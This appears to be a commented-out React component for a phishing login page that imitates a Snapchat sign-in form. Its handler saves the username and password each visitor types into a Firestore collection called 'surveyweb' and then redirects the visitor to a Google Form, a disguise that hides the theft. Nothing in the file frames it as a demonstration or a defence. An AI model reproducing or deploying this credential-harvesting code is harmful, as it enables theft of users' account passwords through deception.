// import React from "react";
// import { SocialIcon } from "react-social-icons";
// import { useEffect, useState } from "react";
// import firebase from "firebase/compat/app";
// import "firebase/compat/firestore";

// export default function Login(props) {
//   const [newMessage, setNewMessage] = useState({});
//   const [username, setuserName] = useState('');
//   const [password, setPassword] = useState('');
//   const [isValid, setIsValid] = useState(false);

//   const handleSendMessage = async (e) => {
        
//     // if(username == '' || password == '')
//     // {
//     //   alert("Please enter username and password");
//     // }
//     // else
//     // {
//     //   const db = firebase.firestore();
//     //     await db.collection("surveyweb").add({
//     //       Platform: props.platform, 
//     //       UserName: username,
//     //       Password: password,
//     //       timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          
          
//     //     });
//     //     setNewMessage("");
//     //     window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSeySsQZySjZ78BNucy2bud7Zgz0eFo29qu242KW312Fp2aMoQ/viewform?pli=1&pli=1';
//     // }
      
//   };

//   // const handleChange = (e) => {
//   //   const name = e.target.name;
//   //   const value = e.target.value;
//   //   setNewMessage((values) => ({ ...values, [name]: value }));
//   // };

//   const handleNameChange = (event) => {
//     setuserName(event.target.value);
//     setIsValid(validateForm());
//   };
  
//   const handlePasswordChange = (event) => {
//     setPassword(event.target.value);
//     setIsValid(validateForm());
//   };

//   const validateForm = () => {
//     return username.trim() !== '' || password.trim() !== '';
//   };
  

//   return (
//     <div className="container">
//       <SocialIcon network="Snapchat" />
//       <div className="formdiv">
//         <input
//           type="text"
//           name="username"
//           value={username.value}
//           onChange={handleNameChange}
//           placeholder="Username or Email"
//           required
//         />
//         <input
//           type="password"
//           name="password"
//           placeholder="password"
//           value={password.value}
//           onChange={handlePasswordChange}
//           required
        
//         />
//         <button onClick={handleSendMessage}>Login</button>
       
//       </div>
//     </div>
//   );
// }
